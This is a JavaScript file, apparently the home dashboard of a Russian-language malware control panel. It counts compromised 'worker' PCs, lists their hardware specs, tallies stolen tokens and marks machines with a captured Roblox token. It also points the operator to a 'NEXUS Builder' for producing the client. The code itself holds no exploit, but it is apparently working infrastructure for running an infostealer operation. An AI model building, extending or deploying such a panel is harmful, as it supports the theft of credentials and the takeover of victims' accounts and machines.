// ── Главная страница (Home / Command Center) ─────────────────────────────────
if (!requireLogin()) throw new Error('redirect');

(function initHomePage() {
  const slot = document.getElementById('sidebarSlot');
  if (slot) slot.innerHTML = renderHeader('home');
  bindLogout();

  // Приветствие оператора
  const user = getUser();
  const opName = operatorDisplayName(user);
  const greetEl = document.getElementById('homeOpName');
  if (greetEl) greetEl.textContent = opName || 'Оператор';

  loadHomeOverview();
})();

async function loadHomeOverview() {
  try {
    const [filesRes, tokensRes] = await Promise.allSettled([
      apiFetch('/files'),
      apiFetch('/tokens-data')
    ]);

    let files = [];
    if (filesRes.status === 'fulfilled' && filesRes.value.ok) {
      const data = await filesRes.value.json();
      files = (Array.isArray(data) ? data : []).filter(f => !isHiddenFile(f.originalName || f.name));
    }

    let tokens = [];
    if (tokensRes.status === 'fulfilled' && tokensRes.value.ok) {
      const tData = await tokensRes.value.json();
      tokens = Array.isArray(tData) ? tData : [];
    }

    // Подсчет уникальных ПК
    const uniquePCs = new Set();
    let lastActiveTs = 0;

    files.forEach(f => {
      const pcName = f.pcName || f.machineName || (f.specs && f.specs.name) || f.name;
      if (pcName) uniquePCs.add(pcName);

      const ts = f.mtime ? new Date(f.mtime).getTime() : 0;
      if (ts > lastActiveTs) lastActiveTs = ts;
    });

    // Обновляем KPI счетчики
    const pcCountEl = document.getElementById('homePcCount');
    if (pcCountEl) pcCountEl.textContent = uniquePCs.size || files.length;

    const tokenCountEl = document.getElementById('homeTokenCount');
    if (tokenCountEl) {
      const validCount = tokens.filter(t => t.valid !== false).length;
      tokenCountEl.textContent = tokens.length > 0 ? `${validCount || tokens.length}` : '0';
    }

    const lastActEl = document.getElementById('homeLastActivity');
    if (lastActEl) {
      if (lastActiveTs > 0) {
        lastActEl.textContent = formatRelativeTime(lastActiveTs);
        lastActEl.title = new Date(lastActiveTs).toLocaleString('ru');
      } else {
        lastActEl.textContent = 'Нет данных';
      }
    }

    // Рендер списка недавних воркеров
    renderHomeRecentWorkers(files);

  } catch (err) {
    console.warn('Ошибка загрузки данных главной панели:', err);
  }
}

function formatRelativeTime(timestamp) {
  if (!timestamp) return '—';
  const diff = Date.now() - timestamp;
  const mins = Math.floor(diff / 60000);
  if (mins < 1) return 'Только что';
  if (mins < 60) return `${mins} мин. назад`;
  const hours = Math.floor(mins / 60);
  if (hours < 24) return `${hours} ч. назад`;
  const days = Math.floor(hours / 24);
  return `${days} дн. назад`;
}

function renderHomeRecentWorkers(files) {
  const container = document.getElementById('homeRecentWorkersList');
  if (!container) return;

  if (!files || files.length === 0) {
    container.innerHTML = `
      <div class="home-empty-notice">
        <div class="home-empty-icon">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
        </div>
        <div>Пока нет подключенных воркеров. Соберите клиент через NEXUS Builder для старта.</div>
      </div>`;
    return;
  }

  // Сортируем по дате (свежие первыми) и берем топ-5
  const sorted = [...files].sort((a, b) => {
    const tA = a.mtime ? new Date(a.mtime).getTime() : 0;
    const tB = b.mtime ? new Date(b.mtime).getTime() : 0;
    return tB - tA;
  }).slice(0, 5);

  container.innerHTML = sorted.map(f => {
    const pcName = f.pcName || (f.specs && f.specs.name) || f.name.replace(/\.[^/.]+$/, '');
    const os = (f.specs && f.specs.os) || 'Windows';
    const cpu = (f.specs && f.specs.cpu) || '—';
    const gpu = (f.specs && f.specs.gpu) || '—';
    const ram = (f.specs && f.specs.ram) || '—';
    const timeStr = f.mtime ? formatRelativeTime(new Date(f.mtime).getTime()) : '—';
    const hasToken = !!(f.roblox && f.roblox.token);

    return `
      <div class="home-worker-row" onclick="location.href='workers.html'">
        <div class="home-worker-left">
          <div class="home-worker-icon">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
          </div>
          <div class="home-worker-meta">
            <div class="home-worker-name">${escapeHtml(pcName)}</div>
            <div class="home-worker-sub">${escapeHtml(os)} • ${escapeHtml(cpu.length > 25 ? cpu.substring(0, 25) + '...' : cpu)}</div>
          </div>
        </div>

        <div class="home-worker-center desktop-only">
          <span class="home-worker-pill">${escapeHtml(gpu.length > 28 ? gpu.substring(0, 28) + '...' : gpu)}</span>
          <span class="home-worker-pill">${escapeHtml(ram)}</span>
          ${hasToken ? '<span class="home-worker-pill token-pill">ROBLOX</span>' : ''}
        </div>

        <div class="home-worker-right">
          <span class="home-worker-time">${timeStr}</span>
          <span class="home-worker-arrow">→</span>
        </div>
      </div>
    `;
  }).join('');
}
